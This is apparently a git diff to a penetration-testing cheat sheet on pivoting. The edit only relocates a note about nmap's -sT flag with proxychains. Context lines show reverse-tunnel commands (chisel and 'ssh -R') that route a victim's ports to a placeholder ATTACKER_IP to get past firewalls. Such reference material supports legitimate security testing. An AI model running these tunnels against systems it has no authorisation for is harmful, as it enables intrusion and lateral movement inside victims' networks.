@@ -72,7 +72,7 @@ Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
-#### SSH (nmap must have -sT parameter if you want to scan ports with proxychains)
+#### SSH 
 
 Local Port Forwarding
 ```
@@ -82,7 +82,7 @@ Remort Port Forwarding (Firewall)
 ```
 ssh -N -R ATTACKER_IP:ATTACKER_PORT(listener):VICTIM_IP:VICTIM_PORT attackeruser@attackerip
 ```
-### Pivoting
+### Pivoting (nmap must have -sT parameter if you want to scan ports with proxychains)
 
 #### SSH
 
